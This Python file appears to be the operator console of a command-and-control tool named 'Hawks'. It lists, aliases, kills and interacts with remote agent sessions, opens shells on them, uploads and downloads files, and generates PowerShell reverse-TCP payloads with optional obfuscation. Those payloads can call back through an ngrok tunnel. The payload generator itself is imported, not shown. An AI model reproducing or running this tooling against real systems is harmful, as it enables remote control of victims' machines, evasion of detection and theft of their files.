from .agent import Agent
from .payload import PayloadGenerator
from .settings import TCPServerSettings
from .session_manager import *
from .database import AgentsDB
from .common import *
from .logging import AutoComplete
from .listener import TCPServer, HttpFileServer
import psutil


class Menu:
    
    def __init__(self):
        self.menu()

    def main_prompt(self):

        if SessionManager.current_session:

            for session_id, (socket, user) in SessionManager.current_session.items():
                computer_name = user.split("/")[0]
                return f"\n{c.UND}Hawks{c.RS}({c.bold}{computer_name}){c.RS}> "
        else:

            return f"\n{c.UND}Hawks{c.RS}> "

    def menu(self):
        
        session = SessionManager()
        auto_complete = AutoComplete()
        
        try:

            while True:
                auto_complete.command_history()
                
                command = input(self.main_prompt())
                
                if len(command) == 0:
                    continue

                args = auto_complete.parse_command(command)
                main_arg = args[0].strip().lower()
                second_arg = args[1].strip() if len(args) > 1 else None

                if main_arg == "help":
                    
                    if len(args) == 1:
                        help()

                    else:

                        if second_arg == "kill":
                            help_kill()
                            
                        elif second_arg == "sessions":
                            help_sessions()
                            
                        elif second_arg == "alias":
                            help_alias()
                        
                        elif second_arg == "interact":
                            help_interact()
                            
                        elif second_arg == "generate":
                            help_generate()
                            
                        elif second_arg == "shell":
                            help_shell()

                        elif second_arg == "upload":
                            help_upload()
                            
                        elif second_arg == "download":
                            help_download()
                            
                        else:
                            print(f"\n{c.alt} No help available for {second_arg} command")
                            
                    
                elif main_arg  == "clear":
                    clear_screen()
                    
                elif main_arg  == "exit":
                    self.quit_hawks()
                    
                elif main_arg  == "sessions":
                    
                    if len(args) == 1:
                        session.view_sessions()
                    else:
                        print(f"\n{c.alt} Invalid argument")
                        
                        
                elif main_arg  == "alias":
                    
                    if len(args) < 3:
                        print(f"\n{c.alt} Missing <session id> or <alias name> argument")
                            
                    else:
                        session_id = second_arg.strip()
                        alias = args[2].strip()
                            
                        session.setAlias(session_id, alias)
                        
                        
                elif main_arg  == "kill":
                    
                    if len(args) < 2:
                        print(Message.missSessionId)

                    else:
                        session_id = second_arg.strip()
                        
                        if session_id == "all":
                            session.killAllSessions()
                            
                        else:
                            session.killSession(session_id)
                    
                elif main_arg  == "interact":
                    
                    if len(args) < 2:
                        print(Message.missSessionId)
                        
                    else:
                        session_id = second_arg.strip()
                        session.interact_session(session_id)
                        
                    
                elif main_arg  == "shell":
                    
                    if not SessionManager.current_session:
                        print(f"\n{c.alt} No session selected")
                        
                    else:
                        for session_id, (socket, user) in SessionManager.current_session.items():
                            agent = Agent(socket, user)
                            agent.shell()         
                            
                            
                elif main_arg == "generate":
                    
                    if len(args) < 2:
                        print(f"\n{c.alt} Missing <payload_template> argument")
                        
                    else:
                        payload_template = args[1].strip()
                        
                        if len(args) < 3:  
                            
                            if payload_template == "windows/powershell_reverse_tcp":
                                help_powershell_payload()
                                
                            elif payload_template == "windows/powershell_reverse_tcp_ssl":
                                help_powershell_ssl_payload()
                                
                            else:
                                print(f"\n{c.alt} Payload template not found")
                                
                        else:

                            lhost = args[2].strip()     
                            port = TCPServerSettings.bind_port
                                
                            if "." not in lhost:
                                interface = psutil.net_if_addrs()
                                    
                                if lhost in interface:
                                    lhost  = interface[lhost][0].address

                                elif lhost == "ngrok":
                                    
                                    if not TCPServerSettings.ngrok_tunnel:
                                        print(f"\n{c.alt} Ngrok tunnel not active")
                                        continue
                                    
                                    lhost = TCPServerSettings.ngrok_addr
                                    port = TCPServerSettings.ngrok_port
                                    

                                else: 
                                    print(f"\n{c.alt} Network interface not found") 
                                    continue
                                    
                            if len(args) > 3:
                                obfuscate = args[3].strip() 
                                
                                if obfuscate == "obfuscate":
                                    obfuscate = True  
                                else:
                                    print(f"\n{c.alt} Invalid argument")
                                    continue
                            else:
                                obfuscate = False
                            
                            payload = PayloadGenerator(payload_template, lhost, port, obfuscate)
                            payload.generatePayload()
                            
                            
                elif main_arg == "upload":
                    
                    if not SessionManager.current_session:
                        
                        print(f"\n{c.alt} No session selected")
                        
                    else:
                        
                        if len(args) < 3:
                            print(f"\n{c.alt} Missing <file path> <target path> arguments")
                            
                        else: 
                            local_path = args[1].strip()
                            upload_path = args[2].strip()
                            
                            for session_id, (socket, user) in SessionManager.current_session.items():
                                agent = Agent(socket, user)
                                agent.upload_file(local_path, upload_path)
                        
                                
                elif main_arg == "download":
                        
                    if not SessionManager.current_session:
                        print(f"\n{c.alt} No session selected")

                    else:
                        if len(args) < 2:
                            print(f"\n{c.alt} Missing <file path> argument")

                        else:
                            download_path = args[1].strip()

                            for session_id, (socket, user) in SessionManager.current_session.items():
                                agent = Agent(socket, user)
                                agent.downloadFile(download_path)
                    
                else:
                    print(f"\n{c.alt} Invalid command")
                    
        except KeyboardInterrupt:
            self.quit_hawks()


    def quit_hawks(self):
        
        if SessionManager.agents_connections:

            confirm = input(f"\n\n{c.alt} Are you sure you want exit? All your connection/sessions will be {c.O}lost{c.RS} [y/n]: ")
            
            if confirm.lower().strip() in ["y", "yes"]:
                
                agents_db = AgentsDB()
                session = SessionManager()
                
                session.killAllSessions()
                agents_db.clear_table()

            
                thanks()
                exit(0)
                
            else:
                self.menu()
                
        else:
            thanks()
            exit(0)
            
        